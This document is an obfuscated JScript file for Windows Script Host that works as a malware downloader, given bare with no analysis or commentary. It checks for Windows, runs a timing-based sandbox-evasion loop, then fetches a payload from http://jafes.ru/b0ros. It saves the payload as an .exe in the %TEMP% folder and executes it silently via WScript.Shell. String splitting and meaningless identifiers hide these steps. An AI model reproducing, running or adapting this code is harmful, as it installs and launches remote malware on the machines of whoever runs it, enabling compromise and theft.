var O = false;
var T0 = "Create"+"Object";
var ZT = function ZE() {return WScript[T0]("WScript"+".Shell");}(), S0 = 11;
var Q1 = "MSXML2"+".XMLHTTP";
var SE = 2;
var T = SE - 2;
function Q(Y){ZT["Run"](Y, T, T);};
function KK(){return Q1 + "";};
function I(S1, IW){T = T * 1; return S1 - IW;};
function TT(){return T0;};
/*@cc_on
  @if (@_win32 || @_win64)
    O = true;
  @end
@*/
if (O)
{
var OU = "";
function US(){return 22;};
var Q3 = 0; var S = 0;
function H()
{
var N0 = new this["Date"]();
var U = N0["getUTCMilliseconds"]();
WScript["Sleep"](US());
var N0 = new this["Date"]();
var H0 = N0["getUTCMilliseconds"]();
WScript["Sleep"](US());
var N0 = new this["Date"]();
var ZR = N0["getUTCMilliseconds"]();
var Q3 = "V";
Q3 = I(H0, U);
var S = "Q0";
S = I(ZR, H0);
OU = "open";
return I(Q3, S);
}
var VZ = false;
var RU = false;
for (var V0 = T; V0 < US() * 1; V0++){if (H() != T){
VZ = true; 
S = "31" + 11 * Q3 + S; 
RU = true; 
break;
}}
function A() {return ((VZ == true) && (VZ == RU)) ? 1 : T;};
if (VZ && A() && RU){
function NG() {return ZT["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9O10f7CBiScjX.ex" + "e";};
 DJ = KK();
 CA = WScript[T0](DJ);
 var P = 1;
do { 
	for (;P;){
	try {
		if (P == 1)
		{
			CA[OU]("GET", "http://jafes.ru/b0ros", false);
			CA["send"]();
			Q2 = "Sleep";
			P = 2;
		}
		WScript[Q2](US() + 120); 
		if (CA["readystate"] < 2 * 2) continue;
		P = T;
		function M(N) {var J = (1, 2, 3, 4, 5, N); return J;};
		X = WScript[TT()]("ADODB.Stream");
		DJ = X;
		DJ[OU]();
		DJ["type"] = M(1);
		DJ["write"](CA["ResponseBody"]);
		X["position"] = M(T);
		DJ["Save" + "ToFile"](NG(), 2);
		X["cl"+"ose"]();
		M0 = NG();
		Q(M0);
	} catch(C){};};
}while (P);
}
}

